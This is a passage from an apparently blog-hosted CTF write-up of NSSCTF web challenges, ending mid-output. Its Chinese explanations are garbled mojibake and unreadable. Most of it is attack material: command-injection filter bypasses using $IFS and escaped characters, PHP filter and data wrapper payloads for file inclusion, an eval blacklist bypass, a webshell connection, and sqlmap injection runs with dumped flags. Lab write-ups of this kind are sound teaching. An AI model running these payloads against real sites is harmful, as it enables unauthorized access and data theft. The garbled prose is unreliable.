-lâ€</p><p>ç¬¬äºŒä¸ªå‚æ•°ï¼Œ$output æ˜¯commandæ‰§è¡Œè¾“å‡ºçš„ç»“æœï¼Œä»¥æ•°ç»„æ ¼å¼å­˜å‚¨</p><p>ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œ$return_varï¼Œç”¨äºä¿å­˜commandæ‰§è¡ŒçŠ¶æ€ï¼Œ0 - æˆåŠŸï¼Œéé›¶ - å¤±è´¥</p><p>è¿”å›å€¼ï¼Œä¸ºcommandæ‰§è¡Œç»“æœçš„æœ€åä¸€è¡Œ</p><p>å¯åƒè€ƒé€™ç¯‡æ–‡ç« ï¼š</p><p><a href="https://">https://blog.csdn.net/afei__&#x2F;article&#x2F;details&#x2F;81901296</a></p><p>teeå‘½ä»¤:Linux teeå‘½ä»¤ç”¨äºè¯»å–æ ‡å‡†è¾“å…¥çš„æ•°æ®ï¼Œå¹¶å°†å…¶å†…å®¹è¾“å‡ºæˆæ–‡ä»¶ã€‚</p><p>ç®¡é“ç¬¦å· <code>|</code>ï¼ˆç«–çº¿ï¼‰è¡¨ç¤ºå°†å‰ä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºâ€ä¼ é€’â€ç»™ä¸‹ä¸€ä¸ªå‘½ä»¤ä½œä¸ºè¾“å…¥ã€‚</p><p>é–‹å•Ÿhackbar æ‰“å‡º ? url &#x3D; l\s &#x2F; | tee test.txt , ç„¶å¾Œ &#x2F;test.txt å¯çœ‹è¦‹ </p><img src="168505fbf862b1d969ee44775210bd39.png" alt="168505fbf862b1d969ee44775210bd39.png" /><p>æœ‰å…©å€‹åƒæ˜¯flagçš„æ±è¥¿ a_here_is_a_f1ag  å’Œ flllllaaaaaaggggggg , </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.../?url=tac  /flllll\aaaaaaggggggg | tee <span class="number">1.</span>txt</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨è½¬ä¹‰ç¬¦å¯ç¹éæª¢æ¸¬ </p><p>ç„¶å¾Œ &#x2F;1.txt å¯çœ‹è¦‹ </p><img src="e96cb7f0490a1c2838e6149640b03463.png" alt="e96cb7f0490a1c2838e6149640b03463.png" /><p>NSSCTF{2b9d7dde-7f03-4a7f-9664-8a623ff22553}</p><h2 id="9-PseudoProtocols"><a href="#9-PseudoProtocols" class="headerlink" title="9. PseudoProtocols"></a>9. PseudoProtocols</h2><p><a href="https://">https://blog.csdn.net/IDHALASHAO/article/details/130368938</a></p><p>PHPä¼ªåè®®</p><p>å¯ä»¥ç”¨</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">php</span>:<span class="comment">//filter/read=convert.base64-encode/resource=hint.php</span></span><br></pre></td></tr></table></figure><p>ä»¥base64encode å½¢å¼å»è¼¸å‡º</p><img src="24c0e5759f9d1c2eac63161ba8532905.png" alt="24c0e5759f9d1c2eac63161ba8532905.png" /><p>base64 è§£ç¢¼ç‚ºï¼š</p><img src="5b9d7541f10767a5bbdd79b40a93ee1e.png" alt="5b9d7541f10767a5bbdd79b40a93ee1e.png" /><br/><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//go to /test2222222222222.php</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>é€²å…¥å¾Œç™¼ç¾phpä»£ç¢¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;max_execution_time&quot;</span>, <span class="string">&quot;180&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>= <span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$a</span>,<span class="string">&#x27;r&#x27;</span>)) === <span class="string">&#x27;I want flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;success\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯çŸ¥GET  isset(a) (aå­˜åœ¨) å’Œ  file_get_contents(a,â€™râ€™)è¦åš´æ ¼ &#x3D; â€˜I want flagâ€™  , å¯ä»¥ä½¿ç”¨phphä¼ªåè®® ç”¨data:&#x2F;&#x2F;  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.../....php?a=data://text/plain,I want flag</span><br></pre></td></tr></table></figure><img src="e3ce167eb017d822d02d41ebc6149ac6.png" alt="e3ce167eb017d822d02d41ebc6149ac6.png" /><p>é‚„å¯ä»¥ç”¨base64  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.../....php?a=data://text/plain;base64,SSB3YW50IGZsYWc=</span><br></pre></td></tr></table></figure><br/><h2 id="10-ez-ez-php"><a href="#10-ez-ez-php" class="headerlink" title="10.ez_ez_php"></a>10.ez_ez_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>], <span class="number">0</span>, <span class="number">3</span>) === <span class="string">&quot;php&quot;</span> ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Nice!!!&quot;</span>;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag.php</span></span><br></pre></td></tr></table></figure><p>è©¦ä¸€è©¦&#x2F;flag.php</p><img src="7a7b62c2eb2672dca08985e521a0a057.png" alt="7a7b62c2eb2672dca08985e521a0a057.png" /><p>çœ‹ä¾†è¦ç”¨phpä¼ªåè®®</p><br/><p>phpä¼ªåè®®</p><p>php:&#x2F;&#x2F;filter&#x2F;<br>è¯»å–åŒ…å«phpä»£ç æ–‡ä»¶å†…å®¹éœ€è¦è¿›è¡ŒæŸç§ç¼–ç è¿›è¡Œè¾“å‡ºï¼Œä¸ç„¶ä¼šå½“ä½œphpä»£ç æ‰§è¡Œå°±æ— æ³•æŸ¥çœ‹æ–‡ç« å†…å®¹</p><h5 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h5><ul><li>allow_url_fopen ï¼šoff&#x2F;on</li><li>allow_url_includeï¼šoff&#x2F;on</li></ul><h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=file</span><br></pre></td></tr></table></figure><h5 id="payloadåˆ†æ"><a href="#payloadåˆ†æ" class="headerlink" title="payloadåˆ†æ"></a>payloadåˆ†æ</h5><ul><li><strong>php:&#x2F;&#x2F;filter&#x2F;</strong>ï¼šè¿™æ˜¯ä¸€ä¸ª PHP çš„æµå°è£…å™¨ï¼Œç”¨äºåœ¨è¯»å†™æ•°æ®æ—¶æä¾›è¿‡æ»¤åŠŸèƒ½ã€‚</li><li><strong>read&#x3D;convert.base64-encode&#x2F;</strong>ï¼šè¿™é‡ŒæŒ‡å®šäº†ä¸€ä¸ªè¿‡æ»¤å™¨ï¼Œå‘Šè¯‰ PHP åœ¨è¯»å–æ•°æ®ä¹‹å‰å°†å…¶è¿›è¡Œ base64 ç¼–ç ã€‚<code>convert.base64-encode</code>æ˜¯ä¸€ä¸ª PHP å†…ç½®çš„è¿‡æ»¤å™¨ï¼Œç”¨äºå°†æ•°æ®è½¬æ¢ä¸º base64 ç¼–ç </li><li><strong>resource&#x3D;file</strong>ï¼šè¿™éƒ¨åˆ†æŒ‡å®šäº†è¦æ“ä½œçš„èµ„æºã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ<code>file</code>è¡¨ç¤ºæˆ‘ä»¬å¸Œæœ›å¯¹ä¸€ä¸ªæ–‡ä»¶è¿›è¡Œæ“ä½œï¼Œå…·ä½“æ¥è¯´æ˜¯å¯¹æ–‡ä»¶çš„å†…å®¹è¿›è¡Œ base64 ç¼–ç è¯»å–</li></ul><img src="c8a9a7c8fae6f5aa36de009dc991f1d6.png" alt="c8a9a7c8fae6f5aa36de009dc991f1d6.png" /><img src="7a6c1d02bb09e707d0f779bf765dc29c.png" alt="7a6c1d02bb09e707d0f779bf765dc29c.png" /><p>å†æ”¹ä¸€æ”¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.../?file=php://filter/read=convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure><img src="f1f266d969b3ca0389251ef3162172a4.png" alt="f1f266d969b3ca0389251ef3162172a4.png" /><img src="52bf506872189284081ce70e94020942.png" alt="52bf506872189284081ce70e94020942.png" /><p>NSSCTF{5c686f83-3496-45b9-9d79-58172f39fb9c}</p><h2 id="11-babyRCE"><a href="#11-babyRCE" class="headerlink" title="11.babyRCE"></a>11.babyRCE</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$rce</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;rce&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$rce</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\;|[0-9]|\*|\`|\%|\&gt;|\&lt;|\&#x27;|\&quot;/i&quot;</span>, <span class="variable">$rce</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$rce</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hhhhhhacker!!!&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ²’æœ‰ls å¯ä»¥?rce&#x3D;ls  , å¦‚ä¸‹</p><img src="4881e43a020115d6c69d266df2bd8107.png" alt="4881e43a020115d6c69d266df2bd8107.png" /><p>å¯æ˜¯ç©ºæ ¼è¢«banäº† å¯æƒ¡å•Š</p><img src="763b8d97fc3c333de1ea22b12041dcb0.png" alt="763b8d97fc3c333de1ea22b12041dcb0.png" /><img src="bcbd7da73f6551422f1dd1948360f09c.png" alt="bcbd7da73f6551422f1dd1948360f09c.png" /><p>çœ‹ä¾†å¯ä»¥ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$IFS</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?rce=rev$IFS./fl\ag.php</span><br></pre></td></tr></table></figure><br/><img src="c7e0c4aa074493852c4e0de14d3b553b.png" alt="c7e0c4aa074493852c4e0de14d3b553b.png" /><p>revä¸€ä¸‹</p><img src="e5a233ee9fed1a3a5c01044d94537910.png" alt="e5a233ee9fed1a3a5c01044d94537910.png" /><p>NSSCTF{0b67ab0f-36eb-4b7a-b2ec-bcd591f56063}</p><h2 id="12-å¯¼å¼¹è¿·è¸ª"><a href="#12-å¯¼å¼¹è¿·è¸ª" class="headerlink" title="12.å¯¼å¼¹è¿·è¸ª"></a>12.å¯¼å¼¹è¿·è¸ª</h2><p>é€™ä¸å¯¦åŠ›å—(bushi~~</p><img src="070744670c7f9ac8af4b8a37ae9fd54b.png" alt="070744670c7f9ac8af4b8a37ae9fd54b.png" /><p>çœ‹çœ‹æœ‰æ²’æœ‰å‘æœå‹™å™¨ç™¼åŒ… ,å¥½åƒæ²’æœ‰</p><img src="dd7b995b2302fc8d981a9b95889b9b1d.png" alt="dd7b995b2302fc8d981a9b95889b9b1d.png" /><p>èªªæ˜ä¸èƒ½æŠ“åŒ…, åªå¥½çœ‹çœ‹æºä»£ç¢¼äº†, æœ€å¾Œåœ¨game.jsæ‰¾åˆ°äº†</p><img src="0a28277e0d4d5d864a3648198b845b02.png" alt="0a28277e0d4d5d864a3648198b845b02.png" /><h2 id="13-caidao"><a href="#13-caidao" class="headerlink" title="13.caidao"></a>13.caidao</h2><p>ä¸€çœ‹å°±çŸ¥é“æ˜¯fuzzäº†, èŸ»åŠå•Ÿå‹•!!!!! wllmç‚ºå¯†ç¢¼ </p><p>æœ€å¾Œåœ¨æ ¹ç›®éŒ„æ‰¾åˆ°flag</p><img src="cef146c06300fd3f89926762c4732a48.png" alt="cef146c06300fd3f89926762c4732a48.png" />## 14.easy_sql<p>å¯ä»¥çœ‹è¦‹åƒæ•¸æ˜¯wllm åœ¨url?wllm&#x3D;1å¾Œ</p><img src="eadfa8156d67834230c0e4a0b51fd586.png" alt="eadfa8156d67834230c0e4a0b51fd586.png" /><p>å…ˆæ‰“é–‹sqlmap ,å…ˆæŸ¥æœ¬æŸ¥æ˜¯å¦æœ‰æ³¨å…¥æ¼æ´</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://node7.anna.nssctf.cn:24766/?wllm=1 --risk 1 --level 1 --technique BTEU --random-agent --timeout 30 -v 1 --batch</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">Parameter: wllm (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: wllm=1&#x27; AND 3264=3264 AND &#x27;PvdX&#x27;=&#x27;PvdX</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><br><span class="line">    Payload: wllm=1&#x27; AND (SELECT 2246 FROM(SELECT COUNT(*),CONCAT(0x7176766271,(SELECT (ELT(2246=2246,1))),0x716b626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND &#x27;tWnq&#x27;=&#x27;tWnq</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: wllm=1&#x27; AND (SELECT 5627 FROM (SELECT(SLEEP(5)))KQyT) AND &#x27;LObx&#x27;=&#x27;LObx</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 3 columns</span><br><span class="line">    Payload: wllm=-8611&#x27; UNION ALL SELECT NULL,CONCAT(0x7176766271,0x707a4e734470455a694f714c5377426f56435a6d4447567979594750585254684a71435578684644,0x716b626271),NULL-- -</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p>ç”¨sqlmapçˆ†åº«:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://node7.anna.nssctf.cn:24766/?wllm=1 --dbs --risk 1 --level 1 --technique BTEU --random-agent --timeout 30 -v 1 --batch</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">available databases [5]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] test</span><br><span class="line">[*] test_db</span><br></pre></td></tr></table></figure><p>çˆ†table:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://node7.anna.nssctf.cn:24766/?wllm=1 -D test_db --tables --risk 1 --level 1 --technique BTEU --random-agent --timeout 30 -v 1 --batch</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Database: test_db</span><br><span class="line">[2 tables]</span><br><span class="line">+---------+</span><br><span class="line">| test_tb |</span><br><span class="line">| users   |</span><br><span class="line">+---------+</span><br></pre></td></tr></table></figure><p>çœ‹çœ‹ test_tbçš„å…§å®¹ :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://node7.anna.nssctf.cn:24766/?wllm=1 -D test_db --dump --risk 1 --level 1 --technique BTEU --random-agent --timeout 30 -v 1 --batch</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Database: test_db</span><br><span class="line">Table: test_tb</span><br><span class="line">[1 entry]</span><br><span class="line">+----+----------------------------------------------+</span><br><span class="line">| id | flag                                         |</span><br><span class="line">+----+----------------------------------------------+</span><br><span class="line">| 1  | NSSCTF&#123;ca97d725-34c3-4a69-b0b9-21a28907ed9f&#125; |</span><br><span class="line">+----+----------------------------------------------+</span><br></pre></td></tr></table></figure><h2 id="15-hardrce"><a href="#15-hardrce" class="headerlink" title="15.hardrce"></a>15.hardrce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$wllm</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>];</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\t&#x27;</span>,<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\+&#x27;</span>,<span class="string">&#x27;\[&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\-&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;\&lt;&#x27;</span>,<span class="string">&#x27;\&gt;&#x27;</span>,<span class="string">&#x27;\=&#x27;</span>,<span class="string">&#x27;\`&#x27;</span>,];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$wllm</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;LTLTè¯´ä¸èƒ½ç”¨è¿™äº›å¥‡å¥‡æ€ªæ€ªçš„ç¬¦å·å“¦ï¼&quot;</span>);</span><br><span class="line">    &#125;&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/is&#x27;</span>,<span class="variable">$wllm</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Ra&#x27;s Al Ghulè¯´ä¸èƒ½ç”¨å­—æ¯å“¦ï¼&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;NoVic4è¯´ï¼šä¸é”™å“¦å°ä¼™å­ï¼Œå¯ä½ èƒ½æ‹¿åˆ°flagå—ï¼Ÿ&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$wllm</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;è”¡æ€»è¯´ï¼šæ³¨æ„å®¡é¢˜ï¼ï¼ï¼&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> è”¡æ€»è¯´ï¼šæ³¨æ„å®¡é¢˜ï¼ï¼ï¼</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°eval($wllm);  æ˜¯æˆ‘å€‘çš„æ”»æ“Šé» , ç›®æ¨™æ˜¯eval(system(â€œlsâ€)) ; </p><p>æ³¨æ„code ä¸­æœ‰blacklist &#x3D; [â€˜ â€˜,â€™\tâ€™,â€™\râ€™,â€™\nâ€™,â€™+â€˜,â€™[â€˜,â€™^â€˜,â€™]â€˜,â€™&quot;â€˜,â€™-â€˜,â€™$â€˜,â€™*â€˜,â€™?â€˜,â€™&lt;â€˜,â€™&gt;â€˜,â€™=â€˜,â€™`â€˜,];</p><p>é‚„ä¸èƒ½ç”¨è‹±æ–‡ preg_match(â€˜&#x2F;[a-zA-Z]&#x2F;isâ€™,$wllm)</p><p>é‚£æˆ‘å€‘å…ˆæ‰“é–‹fuzzshell ç”Ÿæˆçˆ†ç ´å­—å…¸</p><img src="68fc75ee60f78a41d0431d475fd0455f.png" alt="68fc75ee60f78a41d0431d475fd0455f.png" /><p>æ‰“é–‹BPå»çˆ†ç ´</p><img src="d1ce41419b7f2b6ec5cdbdcf65ede830.png" alt="d1ce41419b7f2b6ec5cdbdcf65ede830.png" /><p>ls åªæœ‰index.php  </p><img src="5694fffa82991a04e902a2ea2bb8de50.png" alt="5694fffa82991a04e902a2ea2bb8de50.png" /><p>å†çœ‹çœ‹æ ¹ç›®éŒ„ </p><img src="d231317ca11fe1a936d1cd673796df37.png" alt="d231317ca11fe1a936d1cd673796df37.png" /><p>æœ‰ä¸€å€‹flllllaaaaaagggggggæ–‡ä»¶ , å‰›å‰›è©¦äº†è©¦cd flllllaaaaaagggggggæ²’æˆåŠŸ , æ‡‰è©²æ˜¯txtæ–‡ä»¶ , æ‰“é–‹fuzzshell system(â€œcd &#x2F;flllllaaaaaagggggggâ€) å»é‡ </p><img src="cf1e259f7cd54ca01b87dd24fd1b7f6a.png" alt="cf1e259f7cd54ca01b87dd24fd1b7f6a.png" /><p>BPçˆ†ç ´ä¸€ä¸‹ , </p><img src="1ead456a2dd32d44ed0184888a306ec8.png" alt="1ead456a2dd32d44ed0184888a306ec8.png" /><h2 id="16-sql"><a href="#16-sql" class="headerlink" title="16.sql"></a>16.sql</h2><p><a href="http://node4.anna.nssctf.cn:28194/?wllm=1">http://node4.anna.nssctf.cn:28194/?wllm=1</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://node4.anna.nssctf.cn:28194/?wllm=1 --risk 1 --level 1 --technique BTEU --random-agent --timeout 30 -v 1 --batch</span><br><span class="line">sqlmap -u http://node4.anna.nssctf.cn:28194/?wllm=1 --dbs --risk 1 --level 1 --technique BTEU --random-agent --timeout 30 -v 1 --batch</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">Parameter: wllm (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: wllm=1&#x27; AND 4783=4783 AND &#x27;DgVI&#x27;=&#x27;DgVI</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><br><span class="line">    Payload: wllm=1&#x27; AND (SELECT 3858 FROM(SELECT COUNT(*),CONCAT(0x716b716b71,(SELECT (ELT(3858=3858,1))),0x7170766271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND &#x27;jyRE&#x27;=&#x27;jyRE</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: wllm=1&#x27; AND (SELECT 2372 FROM (SELECT(SLEEP(5)))FzLh) AND &#x27;HGWW&#x27;=&#x27;HGWW</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 3 columns</span><br><span class="line">    Payload: wllm=-4416&#x27; UNION ALL SELECT NULL,NULL,CONCAT(0x716b716b71,0x4d46505569644a6c594c556f656e6c726f706b4d484b6c79586c7574617a6e6b6559774368484f61,0x7170766271)-- -</span><br><span class="line">---</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">available databases 